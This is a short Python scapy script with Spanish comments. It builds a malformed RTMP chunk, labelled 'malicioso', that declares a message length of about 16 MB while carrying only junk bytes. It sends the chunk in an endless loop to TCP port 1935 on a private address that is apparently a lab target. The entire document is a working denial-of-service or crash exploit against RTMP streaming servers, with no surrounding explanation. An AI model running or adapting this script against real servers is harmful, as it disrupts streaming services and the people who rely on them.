from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

evil_chunk = (
    b"\x03" +           # Header básico (Chunk Type 0, Stream ID 3)
    b"\x00\x00\x00" +   # Timestamp (opcional, depende del tipo de chunk)
    b"\xFF\xFF\xFF" +    # Message Length = 16MB+ (malicioso)
    b"\x09" +           # Message Type ID (ej. 0x09 para video)
    b"\x00\x00\x00\x00" +  # Stream ID
    b"\x00" * 1000       # Datos adicionales (basura)
)

pkt = IP(dst="172.18.0.2") / TCP(dport=1935, flags="PA") / Raw(load=evil_chunk)
send(pkt, verbose=1, loop=1, inter=0.1)

